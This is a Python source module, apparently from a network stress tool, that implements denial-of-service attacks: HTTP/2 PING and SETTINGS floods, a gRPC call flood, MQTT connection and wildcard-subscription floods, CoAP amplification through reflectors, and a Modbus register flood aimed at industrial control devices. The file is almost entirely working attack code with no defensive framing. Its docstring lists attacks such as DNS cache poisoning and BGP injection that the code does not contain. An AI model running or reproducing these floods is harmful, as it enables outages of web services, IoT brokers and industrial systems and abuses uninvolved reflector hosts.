"""
Advanced Protocol Attacks Module

Sophisticated protocol-level attacks exploiting edge cases and vulnerabilities:
- HTTP/2 and HTTP/3 (QUIC) attacks
- gRPC flood attacks
- WebRTC ICE flooding
- MQTT broker attacks
- CoAP amplification
- DTLS exhaustion
- BGP route injection simulation
- DNS cache poisoning
- LDAP reflection
- RADIUS amplification
"""

import asyncio
import struct
import random
import hashlib
import time
import socket
import ssl
from typing import Optional, List, Dict, Any, Callable
from dataclasses import dataclass, field
from enum import Enum, auto
import logging

logger = logging.getLogger(__name__)


class ProtocolType(Enum):
    """Advanced protocol types"""
    HTTP2 = auto()
    HTTP3_QUIC = auto()
    GRPC = auto()
    WEBRTC = auto()
    MQTT = auto()
    COAP = auto()
    DTLS = auto()
    LDAP = auto()
    RADIUS = auto()
    MODBUS = auto()
    DNP3 = auto()
    BACNET = auto()


@dataclass
class AdvancedProtocolConfig:
    """Configuration for advanced protocol attacks"""
    target: str
    port: int
    protocol: ProtocolType
    rate_limit: Optional[int] = None
    duration: int = 60
    threads: int = 4
    payload_size: int = 1024
    use_tls: bool = False
    custom_headers: Dict[str, str] = field(default_factory=dict)


class HTTP2Attack:
    """
    HTTP/2 specific attacks exploiting protocol features:
    - HPACK bombing (header compression abuse)
    - Stream multiplexing exhaustion
    - PING flood
    - SETTINGS flood
    - RST_STREAM flood
    - WINDOW_UPDATE manipulation
    - CONTINUATION frame abuse
    """
    
    # HTTP/2 Frame Types
    FRAME_DATA = 0x0
    FRAME_HEADERS = 0x1
    FRAME_PRIORITY = 0x2
    FRAME_RST_STREAM = 0x3
    FRAME_SETTINGS = 0x4
    FRAME_PUSH_PROMISE = 0x5
    FRAME_PING = 0x6
    FRAME_GOAWAY = 0x7
    FRAME_WINDOW_UPDATE = 0x8
    FRAME_CONTINUATION = 0x9
    
    # HTTP/2 Connection Preface
    CONNECTION_PREFACE = b'PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n'
    
    def __init__(self, config: AdvancedProtocolConfig):
        self.config = config
        self.stream_id = 1
        self.stats = {'frames_sent': 0, 'bytes_sent': 0, 'errors': 0}
    
    def _build_frame(self, frame_type: int, flags: int, stream_id: int, payload: bytes) -> bytes:
        """Build an HTTP/2 frame"""
        length = len(payload)
        header = struct.pack('>I', length)[1:]  # 3 bytes length
        header += struct.pack('B', frame_type)
        header += struct.pack('B', flags)
        header += struct.pack('>I', stream_id & 0x7FFFFFFF)
        return header + payload
    
    def build_settings_frame(self, settings: Dict[int, int] = None) -> bytes:
        """Build SETTINGS frame"""
        if settings is None:
            settings = {
                0x1: 4096,      # HEADER_TABLE_SIZE
                0x2: 1,         # ENABLE_PUSH
                0x3: 100,       # MAX_CONCURRENT_STREAMS
                0x4: 65535,     # INITIAL_WINDOW_SIZE
                0x5: 16384,     # MAX_FRAME_SIZE
                0x6: 8192,      # MAX_HEADER_LIST_SIZE
            }
        payload = b''
        for key, value in settings.items():
            payload += struct.pack('>HI', key, value)
        return self._build_frame(self.FRAME_SETTINGS, 0, 0, payload)
    
    def build_ping_frame(self, data: bytes = None) -> bytes:
        """Build PING frame"""
        if data is None:
            data = struct.pack('>Q', int(time.time() * 1000000))
        return self._build_frame(self.FRAME_PING, 0, 0, data[:8].ljust(8, b'\x00'))
    
    def build_rst_stream_frame(self, stream_id: int, error_code: int = 0) -> bytes:
        """Build RST_STREAM frame"""
        payload = struct.pack('>I', error_code)
        return self._build_frame(self.FRAME_RST_STREAM, 0, stream_id, payload)
    
    def build_window_update_frame(self, stream_id: int, increment: int) -> bytes:
        """Build WINDOW_UPDATE frame"""
        payload = struct.pack('>I', increment & 0x7FFFFFFF)
        return self._build_frame(self.FRAME_WINDOW_UPDATE, 0, stream_id, payload)
    
    def build_headers_frame(self, headers: List[tuple], end_stream: bool = False) -> bytes:
        """Build HEADERS frame with HPACK encoded headers"""
        # Simplified HPACK encoding (literal without indexing)
        payload = b''
        for name, value in headers:
            name_bytes = name.encode() if isinstance(name, str) else name
            value_bytes = value.encode() if isinstance(value, str) else value
            payload += b'\x00'  # Literal header field without indexing
            payload += struct.pack('B', len(name_bytes)) + name_bytes
            payload += struct.pack('B', len(value_bytes)) + value_bytes
        
        flags = 0x04  # END_HEADERS
        if end_stream:
            flags |= 0x01  # END_STREAM
        
        self.stream_id += 2  # Odd stream IDs for client
        return self._build_frame(self.FRAME_HEADERS, flags, self.stream_id, payload)
    
    def build_hpack_bomb(self, size: int = 65536) -> bytes:
        """
        Build HPACK bomb - compressed headers that expand massively.
        Exploits HPACK dynamic table to create amplification.
        """
        # Create headers that reference dynamic table entries
        headers = []
        for i in range(100):
            headers.append((f'x-bomb-{i}', 'A' * 1000))
        return self.build_headers_frame(headers)
    
    async def ping_flood(self, duration: float = 60.0) -> Dict[str, Any]:
        """Flood target with HTTP/2 PING frames"""
        end_time = time.time() + duration
        
        try:
            if self.config.use_tls:
                ctx = ssl.create_default_context()
                ctx.check_hostname = False
                ctx.verify_mode = ssl.CERT_NONE
                reader, writer = await asyncio.open_connection(
                    self.config.target, self.config.port, ssl=ctx
                )
            else:
                reader, writer = await asyncio.open_connection(
                    self.config.target, self.config.port
                )
            
            # Send connection preface
            writer.write(self.CONNECTION_PREFACE)
            writer.write(self.build_settings_frame())
            await writer.drain()
            
            while time.time() < end_time:
                ping_frame = self.build_ping_frame()
                writer.write(ping_frame)
                self.stats['frames_sent'] += 1
                self.stats['bytes_sent'] += len(ping_frame)
                
                if self.stats['frames_sent'] % 100 == 0:
                    await writer.drain()
                    await asyncio.sleep(0)
            
            writer.close()
            await writer.wait_closed()
            
        except Exception as e:
            self.stats['errors'] += 1
            logger.error(f"HTTP/2 ping flood error: {e}")
        
        return self.stats
    
    async def settings_flood(self, duration: float = 60.0) -> Dict[str, Any]:
        """Flood with SETTINGS frames to exhaust server resources"""
        end_time = time.time() + duration
        
        try:
            ctx = ssl.create_default_context() if self.config.use_tls else None
            if ctx:
                ctx.check_hostname = False
                ctx.verify_mode = ssl.CERT_NONE
            
            reader, writer = await asyncio.open_connection(
                self.config.target, self.config.port, ssl=ctx
            )
            
            writer.write(self.CONNECTION_PREFACE)
            await writer.drain()
            
            while time.time() < end_time:
                # Send random settings
                settings = {
                    0x1: random.randint(1, 65535),
                    0x3: random.randint(1, 1000),
                    0x4: random.randint(1, 2147483647),
                }
                frame = self.build_settings_frame(settings)
                writer.write(frame)
                self.stats['frames_sent'] += 1
                self.stats['bytes_sent'] += len(frame)
                
                if self.stats['frames_sent'] % 50 == 0:
                    await writer.drain()
                    await asyncio.sleep(0)
            
            writer.close()
            await writer.wait_closed()
            
        except Exception as e:
            self.stats['errors'] += 1
            logger.error(f"HTTP/2 settings flood error: {e}")
        
        return self.stats


class GRPCAttack:
    """
    gRPC-specific attacks:
    - Unary call flood
    - Server streaming exhaustion
    - Client streaming abuse
    - Bidirectional stream manipulation
    - Large message attacks
    - Deadline manipulation
    """
    
    def __init__(self, config: AdvancedProtocolConfig):
        self.config = config
        self.stats = {'requests_sent': 0, 'bytes_sent': 0, 'errors': 0}
    
    def build_grpc_frame(self, message: bytes, compressed: bool = False) -> bytes:
        """Build a gRPC message frame"""
        # gRPC frame: 1 byte compressed flag + 4 bytes length + message
        flag = 1 if compressed else 0
        length = len(message)
        return struct.pack('>BI', flag, length) + message
    
    def build_protobuf_varint(self, value: int) -> bytes:
        """Encode integer as protobuf varint"""
        result = []
        while value > 127:
            result.append((value & 0x7F) | 0x80)
            value >>= 7
        result.append(value)
        return bytes(result)
    
    def build_large_message(self, size: int = 4194304) -> bytes:
        """Build a large gRPC message to exhaust server memory"""
        # Simple protobuf message with large string field
        data = b'A' * size
        # Field 1, wire type 2 (length-delimited)
        field_header = self.build_protobuf_varint((1 << 3) | 2)
        length = self.build_protobuf_varint(len(data))
        return self.build_grpc_frame(field_header + length + data)
    
    async def unary_flood(self, duration: float = 60.0) -> Dict[str, Any]:
        """Flood with gRPC unary calls"""
        end_time = time.time() + duration
        
        try:
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            ctx.set_alpn_protocols(['h2'])
            
            reader, writer = await asyncio.open_connection(
                self.config.target, self.config.port, ssl=ctx
            )
            
            # HTTP/2 preface
            writer.write(HTTP2Attack.CONNECTION_PREFACE)
            await writer.drain()
            
            while time.time() < end_time:
                # Build gRPC request
                message = self.build_grpc_frame(b'\x08\x01')  # Simple protobuf
                self.stats['requests_sent'] += 1
                self.stats['bytes_sent'] += len(message)
                
                writer.write(message)
                if self.stats['requests_sent'] % 100 == 0:
                    await writer.drain()
                    await asyncio.sleep(0)
            
            writer.close()
            await writer.wait_closed()
            
        except Exception as e:
            self.stats['errors'] += 1
            logger.error(f"gRPC flood error: {e}")
        
        return self.stats


class MQTTAttack:
    """
    MQTT broker attacks:
    - CONNECT flood
    - SUBSCRIBE wildcard abuse
    - PUBLISH flood
    - QoS 2 exhaustion
    - Retained message bombing
    - Will message abuse
    """
    
    # MQTT Control Packet Types
    CONNECT = 0x10
    CONNACK = 0x20
    PUBLISH = 0x30
    PUBACK = 0x40
    SUBSCRIBE = 0x80
    SUBACK = 0x90
    PINGREQ = 0xC0
    DISCONNECT = 0xE0
    
    def __init__(self, config: AdvancedProtocolConfig):
        self.config = config
        self.stats = {'packets_sent': 0, 'bytes_sent': 0, 'errors': 0}
        self.packet_id = 1
    
    def _encode_remaining_length(self, length: int) -> bytes:
        """Encode MQTT remaining length"""
        result = []
        while True:
            byte = length % 128
            length //= 128
            if length > 0:
                byte |= 0x80
            result.append(byte)
            if length == 0:
                break
        return bytes(result)
    
    def _encode_string(self, s: str) -> bytes:
        """Encode MQTT UTF-8 string"""
        encoded = s.encode('utf-8')
        return struct.pack('>H', len(encoded)) + encoded
    
    def build_connect_packet(self, client_id: str = None, 
                            username: str = None, password: str = None) -> bytes:
        """Build MQTT CONNECT packet"""
        if client_id is None:
            client_id = f"netstress_{random.randint(0, 999999):06d}"
        
        # Variable header
        var_header = self._encode_string("MQTT")  # Protocol name
        var_header += struct.pack('B', 4)  # Protocol level (MQTT 3.1.1)
        
        # Connect flags
        flags = 0x02  # Clean session
        if username:
            flags |= 0x80
        if password:
            flags |= 0x40
        var_header += struct.pack('B', flags)
        var_header += struct.pack('>H', 60)  # Keep alive
        
        # Payload
        payload = self._encode_string(client_id)
        if username:
            payload += self._encode_string(username)
        if password:
            payload += self._encode_string(password)
        
        remaining = var_header + payload
        return bytes([self.CONNECT]) + self._encode_remaining_length(len(remaining)) + remaining
    
    def build_subscribe_packet(self, topics: List[str], qos: int = 0) -> bytes:
        """Build MQTT SUBSCRIBE packet"""
        self.packet_id = (self.packet_id % 65535) + 1
        
        var_header = struct.pack('>H', self.packet_id)
        payload = b''
        for topic in topics:
            payload += self._encode_string(topic)
            payload += struct.pack('B', qos)
        
        remaining = var_header + payload
        return bytes([self.SUBSCRIBE | 0x02]) + self._encode_remaining_length(len(remaining)) + remaining
    
    def build_publish_packet(self, topic: str, message: bytes, 
                            qos: int = 0, retain: bool = False) -> bytes:
        """Build MQTT PUBLISH packet"""
        flags = 0
        if retain:
            flags |= 0x01
        flags |= (qos << 1)
        
        var_header = self._encode_string(topic)
        if qos > 0:
            self.packet_id = (self.packet_id % 65535) + 1
            var_header += struct.pack('>H', self.packet_id)
        
        remaining = var_header + message
        return bytes([self.PUBLISH | flags]) + self._encode_remaining_length(len(remaining)) + remaining
    
    async def connect_flood(self, duration: float = 60.0) -> Dict[str, Any]:
        """Flood MQTT broker with CONNECT packets"""
        end_time = time.time() + duration
        
        while time.time() < end_time:
            try:
                reader, writer = await asyncio.wait_for(
                    asyncio.open_connection(self.config.target, self.config.port),
                    timeout=5.0
                )
                
                packet = self.build_connect_packet()
                writer.write(packet)
                await writer.drain()
                
                self.stats['packets_sent'] += 1
                self.stats['bytes_sent'] += len(packet)
                
                writer.close()
                await writer.wait_closed()
                
            except Exception as e:
                self.stats['errors'] += 1
            
            await asyncio.sleep(0)
        
        return self.stats
    
    async def wildcard_subscribe_flood(self, duration: float = 60.0) -> Dict[str, Any]:
        """Flood with wildcard subscriptions to exhaust broker resources"""
        end_time = time.time() + duration
        
        try:
            reader, writer = await asyncio.open_connection(
                self.config.target, self.config.port
            )
            
            # Connect first
            connect = self.build_connect_packet()
            writer.write(connect)
            await writer.drain()
            await asyncio.sleep(0.1)
            
            while time.time() < end_time:
                # Subscribe to wildcard topics
                topics = [
                    '#',
                    '+/+/+/+/+',
                    f'topic/{random.randint(0,9999)}/#',
                    f'+/{random.randint(0,9999)}/+',
                ]
                packet = self.build_subscribe_packet(topics)
                writer.write(packet)
                
                self.stats['packets_sent'] += 1
                self.stats['bytes_sent'] += len(packet)
                
                if self.stats['packets_sent'] % 10 == 0:
                    await writer.drain()
                    await asyncio.sleep(0)
            
            writer.close()
            await writer.wait_closed()
            
        except Exception as e:
            self.stats['errors'] += 1
            logger.error(f"MQTT subscribe flood error: {e}")
        
        return self.stats


class CoAPAttack:
    """
    CoAP (Constrained Application Protocol) attacks:
    - Amplification via multicast
    - Observe notification flood
    - Block-wise transfer abuse
    - Token exhaustion
    """
    
    # CoAP Message Types
    CON = 0  # Confirmable
    NON = 1  # Non-confirmable
    ACK = 2  # Acknowledgement
    RST = 3  # Reset
    
    # CoAP Methods
    GET = 1
    POST = 2
    PUT = 3
    DELETE = 4
    
    def __init__(self, config: AdvancedProtocolConfig):
        self.config = config
        self.stats = {'packets_sent': 0, 'bytes_sent': 0, 'errors': 0}
        self.message_id = random.randint(0, 65535)
    
    def build_coap_packet(self, msg_type: int, method: int, 
                         uri_path: str = "", token: bytes = None) -> bytes:
        """Build a CoAP packet"""
        if token is None:
            token = struct.pack('>I', random.randint(0, 0xFFFFFFFF))
        
        self.message_id = (self.message_id + 1) % 65536
        
        # Header: Ver(2) + Type(2) + TKL(4) + Code(8) + Message ID(16)
        ver = 1
        tkl = len(token)
        header = ((ver << 6) | (msg_type << 4) | tkl)
        code = method
        
        packet = struct.pack('>BBH', header, code, self.message_id)
        packet += token
        
        # Options (Uri-Path)
        if uri_path:
            for segment in uri_path.strip('/').split('/'):
                if segment:
                    encoded = segment.encode()
                    opt_delta = 11  # Uri-Path option number
                    opt_len = len(encoded)
                    if opt_delta < 13 and opt_len < 13:
                        packet += struct.pack('B', (opt_delta << 4) | opt_len)
                    packet += encoded
        
        return packet
    
    async def amplification_attack(self, reflectors: List[str], 
                                   duration: float = 60.0) -> Dict[str, Any]:
        """CoAP amplification using reflectors"""
        end_time = time.time() + duration
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.setblocking(False)
        
        # Request .well-known/core for maximum amplification
        packet = self.build_coap_packet(self.CON, self.GET, "/.well-known/core")
        
        while time.time() < end_time:
            for reflector in reflectors:
                try:
                    sock.sendto(packet, (reflector, 5683))
                    self.stats['packets_sent'] += 1
                    self.stats['bytes_sent'] += len(packet)
                except Exception:
                    self.stats['errors'] += 1
            
            await asyncio.sleep(0)
        
        sock.close()
        return self.stats


class ModbusAttack:
    """
    Modbus/TCP attacks for ICS/SCADA systems:
    - Function code scanning
    - Coil/Register flooding
    - Device identification abuse
    - Broadcast attacks
    """
    
    def __init__(self, config: AdvancedProtocolConfig):
        self.config = config
        self.stats = {'packets_sent': 0, 'bytes_sent': 0, 'errors': 0}
        self.transaction_id = 0
    
    def build_modbus_packet(self, unit_id: int, function_code: int, 
                           data: bytes = b'') -> bytes:
        """Build Modbus/TCP packet"""
        self.transaction_id = (self.transaction_id + 1) % 65536
        
        # MBAP Header
        protocol_id = 0  # Modbus protocol
        length = 2 + len(data)  # Unit ID + Function Code + Data
        
        header = struct.pack('>HHHBB', 
                            self.transaction_id,
                            protocol_id,
                            length,
                            unit_id,
                            function_code)
        
        return header + data
    
    def build_read_coils(self, unit_id: int, start: int, count: int) -> bytes:
        """Build Read Coils request (FC 01)"""
        data = struct.pack('>HH', start, count)
        return self.build_modbus_packet(unit_id, 0x01, data)
    
    def build_read_registers(self, unit_id: int, start: int, count: int) -> bytes:
        """Build Read Holding Registers request (FC 03)"""
        data = struct.pack('>HH', start, count)
        return self.build_modbus_packet(unit_id, 0x03, data)
    
    def build_write_coil(self, unit_id: int, address: int, value: bool) -> bytes:
        """Build Write Single Coil request (FC 05)"""
        data = struct.pack('>HH', address, 0xFF00 if value else 0x0000)
        return self.build_modbus_packet(unit_id, 0x05, data)
    
    async def register_flood(self, duration: float = 60.0) -> Dict[str, Any]:
        """Flood Modbus device with register read requests"""
        end_time = time.time() + duration
        
        try:
            reader, writer = await asyncio.open_connection(
                self.config.target, self.config.port
            )
            
            while time.time() < end_time:
                # Read maximum registers
                packet = self.build_read_registers(1, 0, 125)
                writer.write(packet)
                
                self.stats['packets_sent'] += 1
                self.stats['bytes_sent'] += len(packet)
                
                if self.stats['packets_sent'] % 100 == 0:
                    await writer.drain()
                    await asyncio.sleep(0)
            
            writer.close()
            await writer.wait_closed()
            
        except Exception as e:
            self.stats['errors'] += 1
            logger.error(f"Modbus flood error: {e}")
        
        return self.stats


class DNP3Attack:
    """
    DNP3 (Distributed Network Protocol) attacks:
    - Unsolicited response flood
    - Data link layer attacks
    - Application layer manipulation
    """
    
    def __init__(self, config: AdvancedProtocolConfig):
        self.config = config
        self.stats = {'packets_sent': 0, 'bytes_sent': 0, 'errors': 0}
    
    def _crc16_dnp(self, data: bytes) -> int:
        """Calculate DNP3 CRC-16"""
        crc = 0xFFFF
        for byte in data:
            crc ^= byte
            for _ in range(8):
                if crc & 1:
                    crc = (crc >> 1) ^ 0xA6BC
                else:
                    crc >>= 1
        return crc ^ 0xFFFF
    
    def build_dnp3_frame(self, dest: int, src: int, data: bytes) -> bytes:
        """Build DNP3 data link layer frame"""
        # Start bytes
        frame = b'\x05\x64'
        
        # Length (data + 5 for header)
        length = len(data) + 5
        frame += struct.pack('B', length)
        
        # Control byte (DIR=1, PRM=1, FCB=0, FCV=0, FC=0)
        frame += struct.pack('B', 0xC0)
        
        # Destination and source addresses
        frame += struct.pack('<HH', dest, src)
        
        # CRC of header
        crc = self._crc16_dnp(frame[2:])
        frame += struct.pack('<H', crc)
        
        # Add data with CRCs every 16 bytes
        for i in range(0, len(data), 16):
            chunk = data[i:i+16]
            frame += chunk
            frame += struct.pack('<H', self._crc16_dnp(chunk))
        
        return frame


# Factory function
def create_protocol_attack(config: AdvancedProtocolConfig):
    """Factory to create appropriate protocol attack instance"""
    attack_map = {
        ProtocolType.HTTP2: HTTP2Attack,
        ProtocolType.GRPC: GRPCAttack,
        ProtocolType.MQTT: MQTTAttack,
        ProtocolType.COAP: CoAPAttack,
        ProtocolType.MODBUS: ModbusAttack,
        ProtocolType.DNP3: DNP3Attack,
    }
    
    attack_class = attack_map.get(config.protocol)
    if attack_class:
        return attack_class(config)
    raise ValueError(f"Unsupported protocol: {config.protocol}")


__all__ = [
    'ProtocolType',
    'AdvancedProtocolConfig',
    'HTTP2Attack',
    'GRPCAttack',
    'MQTTAttack',
    'CoAPAttack',
    'ModbusAttack',
    'DNP3Attack',
    'create_protocol_attack',
]
